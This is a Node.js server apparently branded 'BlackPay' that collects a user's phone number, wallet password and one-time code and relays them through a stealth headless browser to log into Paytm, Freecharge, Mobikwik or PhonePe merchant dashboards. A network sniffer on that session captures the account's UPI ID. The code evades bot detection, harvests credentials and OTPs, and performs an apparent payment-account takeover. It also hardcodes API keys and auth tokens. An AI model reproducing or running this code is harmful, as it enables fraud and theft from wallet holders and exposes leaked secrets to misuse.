const express = require('express');
const cors = require('cors');
const https = require('https');
const axios = require('axios');

// 🔴 PREMIUM STEALTH BROWSER (Anti-Block)
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());

const FAST2SMS_API_KEY = "dl51mufyW8oVtTEzHYnKXIUjx6GSMFDCR93JBObN40saehLqkvG5HnUSwa6mIzVDYso8p7AWhEQJNXPc";
const PAYTM_AUTH_TOKEN = "Basic cGF5dG0tdW1wMjpsdDRJMUZLaVZGRndjTk5ScmxwS05pNW1LMk85TFQxdg==";

let browser;
let page;
let globalState = {};
let interceptedUpi = ""; // 🚀 PREMIUM SCANNER MEMORY

app.get('/', (req, res) => {
    res.json({ success: true, message: "BlackPay Premium API Server Running!" });
});

// ============================================================================
// 0. SEND SMS VIA FAST2SMS
// ============================================================================
app.post('/api/send-sms', (req, res) => {
    const { phone, otp } = req.body;
    if (!phone || !otp) return res.status(400).json({ success: false, message: "Missing data." });
    const msg = encodeURIComponent(`Your Verification Code is ${otp}`);
    const url = `https://www.fast2sms.com/dev/bulkV2?authorization=${FAST2SMS_API_KEY}&route=q&message=${msg}&language=english&flash=0&numbers=${phone}`;
    https.get(url, (response) => {
        let data = ''; response.on('data', (c) => data += c);
        response.on('end', () => res.json({ success: true, message: "OTP Sent!" }));
    }).on("error", () => res.status(500).json({ success: false, message: "SMS Error" }));
});

// ============================================================================
// 1. SEND OTP (PAYTM / FREECHARGE / MOBIKWIK / PHONEPE)
// ============================================================================
app.post('/api/wallet/send-otp', async (req, res) => {
    const { phone, password, walletType } = req.body; 
    if (!phone || phone.length !== 10) return res.status(400).json({ success: false, message: "Invalid number" });

    let walletName = walletType ? walletType.toLowerCase().trim() : "";
    globalState[phone] = { wallet: walletName, password: password };
    interceptedUpi = ""; // Reset sniffer

    try {
        if (browser) { try { await browser.close(); } catch(e){} browser = null; }
        
        browser = await puppeteer.connect({ 
            browserWSEndpoint: 'wss://chrome.browserless.io?token=2V6jGIUi9i2HHBN13c561fc98136daa73b9388455b558503a&stealth=true',
            defaultViewport: { width: 1920, height: 1080 }
        });
        
        page = await browser.newPage();
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

        // 🚀 PREMIUM NETWORK SNIFFER ACTIVATE
        page.on('response', async (response) => {
            if (response.request().resourceType() === 'xhr' || response.request().resourceType() === 'fetch') {
                try {
                    const text = await response.text();
                    const upiRegex = /[a-zA-Z0-9.\-_]{3,}@(pty|paytmpty|paytm|paytmqr|freecharge|ikwik|ybl|axl|upi|apypaytm)/i;
                    const match = text.match(upiRegex);
                    if (match && !interceptedUpi) {
                        interceptedUpi = match[0];
                        console.log(`[🚀 PREMIUM SCANNER CAUGHT UPI]: ${interceptedUpi}`);
                    }
                } catch(e) {}
            }
        });

        // --- PAYTM LOGIC ---
        if (walletName.includes('paytm')) {
            await page.goto('https://dashboard.paytm.com/login/', { waitUntil: 'domcontentloaded', timeout: 35000 });
            await new Promise(r => setTimeout(r, 2000));
            
            let inputField = await page.$('input[type="tel"]') || await page.$('input:not([type="hidden"])');
            if(inputField) {
                await inputField.focus(); await inputField.click({ clickCount: 3 }); await inputField.press('Backspace');       
                await inputField.type(phone, { delay: 100 }); 
                await page.keyboard.press('Enter');
            }

            if (password) {
                await new Promise(r => setTimeout(r, 2000));
                let passField = await page.$('input[type="password"]');
                if (passField) {
                    await passField.focus(); await passField.type(password, { delay: 100 });
                    await page.keyboard.press('Enter');
                }
            }
        }
        // --- FREECHARGE LOGIC FIX ---
        else if (walletName.includes('freecharge')) {
            await page.goto('https://www.freecharge.in/', { waitUntil: 'domcontentloaded', timeout: 35000 });
            await new Promise(r => setTimeout(r, 2000));
            // Try to click login button first if input is hidden
            try {
                await page.evaluate(() => {
                    let btns = document.querySelectorAll('button, a, div');
                    for(let b of btns) { if(b.innerText && b.innerText.toLowerCase().includes('login')) { b.click(); return; } }
                });
            } catch(e){}
            await new Promise(r => setTimeout(r, 1000));
            
            await page.keyboard.type(phone, { delay: 100 });
            await page.keyboard.press('Enter');
        }
        // --- OTHERS ---
        else {
            if (walletName.includes('mobikwik')) await page.goto('https://www.mobikwik.com/', { waitUntil: 'domcontentloaded' });
            else if (walletName.includes('phonepe')) await page.goto('https://business.phonepe.com/login', { waitUntil: 'domcontentloaded' });
            await new Promise(r => setTimeout(r, 2000));
            await page.keyboard.type(phone, { delay: 100 });
            await page.keyboard.press('Enter');
        }
        
        res.json({ success: true, message: `OTP sent to ${phone}` });
    } catch (error) { 
        console.log("Error:", error.message);
        res.status(500).json({ success: false, message: "Network slow. Try again." }); 
    }
});

// ============================================================================
// 2. VERIFY OTP & EXTRACT UPI (USING PREMIUM SNIFFER)
// ============================================================================
app.post('/api/wallet/verify-otp', async (req, res) => {
    const { otp, phone } = req.body; 
    if (!otp) return res.status(400).json({ success: false, message: "OTP missing." });
    const walletName = globalState[phone]?.wallet || "";

    try {
        if (!page) return res.status(400).json({ success: false, message: "Session expired. Try again." });

        await page.keyboard.type(otp, { delay: 100 });
        await page.keyboard.press('Enter');
        
        console.log(`[+] Waiting for Dashboard to load and Sniffer to catch UPI...`);
        await new Promise(r => setTimeout(r, 7000)); // Wait for API response

        // Trigger QR page if sniffer hasn't caught it yet
        if (!interceptedUpi && walletName.includes('paytm')) {
            try { await page.goto('https://dashboard.paytm.com/next/qr-details', { waitUntil: 'domcontentloaded' }); } catch(e){}
            await new Promise(r => setTimeout(r, 4000));
        }

        let finalUpi = interceptedUpi;

        // If sniffer failed, try DOM scraping as fallback
        if (!finalUpi && walletName.includes('paytm')) {
            try {
                finalUpi = await page.evaluate(() => {
                    const regex = /[a-zA-Z0-9.\-_]{3,}@(pty|paytmpty|paytm|paytmqr|upi)/i;
                    const match = document.body.innerText.match(regex);
                    return match ? match[0] : "";
                });
            } catch(e){}
        }

        if (browser) { try { await browser.close(); } catch(e){} browser = null; }

        if (finalUpi) {
            return res.json({ success: true, message: "Account Successfully Bound!", upi_id: finalUpi, mobile: phone });
        } else {
            return res.status(400).json({ success: false, message: "Login Failed or Invalid OTP. Please try again." });
        }
    } catch (error) { 
        res.status(500).json({ success: false, message: "Verification Failed." }); 
    }
});

app.post('/api/wallet/verify-utr', async (req, res) => {
    const { utr } = req.body; 
    res.json({ success: false, message: "Awaiting Manual Confirmation.", utr: utr });
});

app.listen(3000, '0.0.0.0', () => { console.log(`🚀 Premium Scanner Server running!`); });
